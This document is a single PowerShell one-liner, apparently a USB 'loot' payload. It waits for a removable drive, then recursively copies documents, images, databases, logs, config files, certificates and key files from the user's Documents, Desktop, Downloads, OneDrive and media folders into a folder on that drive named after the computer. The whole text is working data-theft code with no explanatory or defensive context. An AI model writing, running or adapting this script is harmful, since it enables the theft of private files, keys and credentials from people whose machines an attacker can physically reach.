clear; $removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }; $count = $removableDrives.count; $i = 30; While ($true) { cls; write "Connect a Device.. ($i)" -ForegroundColor Yellow; $removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }; sleep 1; if (!($count -eq $removableDrives.count)) { write "USB Drive Connected!" -ForegroundColor Green; break }$i--; if ($i -eq 0 ) { write "Timeout! Exiting" -ForegroundColor Red; sleep 1; exit } }$drive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Sort-Object -Descending | Select-Object -First 1; $driveLetter = $drive.DeviceID; write "Loot Drive Set To : $driveLetter/"; $fileExtensions = @("*.log", "*.db", "*.txt", "*.json", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft"); $foldersToSearch = @("$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\OneDrive", "$env:USERPROFILE\Pictures", "$env:USERPROFILE\Videos"); $destinationPath = "$driveLetter\$env:COMPUTERNAME`_Loot"; if (-not (Test-Path -Path $destinationPath)) { New-Item -ItemType Directory -Path $destinationPath -Force; write "New Folder Created : $destinationPath" } $driveIndex = 0; foreach ($folder in $foldersToSearch) { write "Searching in $folder"; foreach ($extension in $fileExtensions) { $files = Get-ChildItem -Path $folder -Recurse -Filter $extension -File; foreach ($file in $files) { $driveIndex++; if ($driveIndex -gt 30) { $drive = Get-Volume -DriveLetter $driveLetter.trimEnd(":"); if ($drive) { $driveIndex = 0 }else { exit } }$destinationFile = Join-Path -Path $destinationPath -ChildPath $file.Name; Copy-Item -Path $file.FullName -Destination $destinationFile -Force } } }
